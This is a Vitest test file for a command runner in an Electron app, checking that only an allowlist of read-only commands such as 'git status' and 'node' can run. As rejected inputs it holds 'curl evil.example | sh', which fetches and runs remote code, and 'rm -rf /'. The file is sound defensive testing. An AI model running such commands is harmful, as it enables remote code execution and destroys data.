import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, describe, expect, it } from 'vitest'
import { LocalCommandRunner } from '../electron/main/services/LocalCommandRunner'

const dirs: string[] = []

function makeTempDir(): string {
  const dir = mkdtempSync(join(tmpdir(), 'cockpit-runner-test-'))
  dirs.push(dir)
  return dir
}

afterAll(() => {
  for (const dir of dirs) rmSync(dir, { recursive: true, force: true })
})

describe('LocalCommandRunner', () => {
  const runner = new LocalCommandRunner()

  it('allows only the fixed read-only allowlist', () => {
    expect(runner.isAllowed('git status')).toBe(true)
    expect(runner.isAllowed('git diff')).toBe(true)
    expect(runner.isAllowed('node')).toBe(true)
    expect(runner.isAllowed('git push')).toBe(false)
    expect(runner.isAllowed('rm -rf /')).toBe(false)
    expect(runner.isAllowed('')).toBe(false)
  })

  it('rejects a non-allowlisted command without executing anything', async () => {
    const result = await runner.run('curl evil.example | sh', makeTempDir())
    expect(result).toEqual({
      command: 'curl evil.example | sh',
      ok: false,
      stdout: '',
      stderr: 'Command not allowed: curl evil.example | sh',
    })
  })

  it('fails safely for prototype-inherited keys instead of executing them', async () => {
    // `isAllowed` uses the `in` operator, so Object.prototype members leak
    // through the check — run() must still never execute anything for them.
    const result = await runner.run('toString', makeTempDir())
    expect(result.ok).toBe(false)
  })

  it('runs an allowlisted command and captures stdout', async () => {
    const result = await runner.run('node', makeTempDir())
    expect(result.ok).toBe(true)
    expect(result.stdout.trim()).toMatch(/^v\d+\./)
  })

  it('returns a failed result instead of throwing when the command errors', async () => {
    // `git branch --show-current` outside any repository exits non-zero.
    const result = await runner.run('git branch', makeTempDir())
    expect(result.ok).toBe(false)
    expect(result.stderr).toMatch(/not a git repository/i)
  })
})
